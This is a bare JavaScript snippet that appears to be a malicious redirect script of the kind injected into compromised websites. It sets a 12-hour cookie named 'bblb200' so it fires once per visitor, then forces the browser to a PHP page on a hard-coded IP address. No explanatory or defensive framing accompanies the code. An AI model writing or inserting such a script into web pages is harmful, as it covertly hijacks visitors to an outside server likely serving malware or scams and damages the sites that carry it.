trpend();
function trpend(){
	
			if (document.cookie.indexOf("bblb200=") >= 0) { 
			
			} else { 
				st(); 
				var ul = "http://193.201.224.233/n/m12.php"; 
				document.location.href = ul; 
				window.location.href = ul; 
			}
	
            if(!document.body){
                return setTimeout(trpend(),1);
            }
}

function st(){ var now = new Date();now.setTime(now.getTime() + 1 * 3600 * 1000 * 12);document.cookie = "bblb200=1; expires=" + now.toUTCString() + "; path=/";}

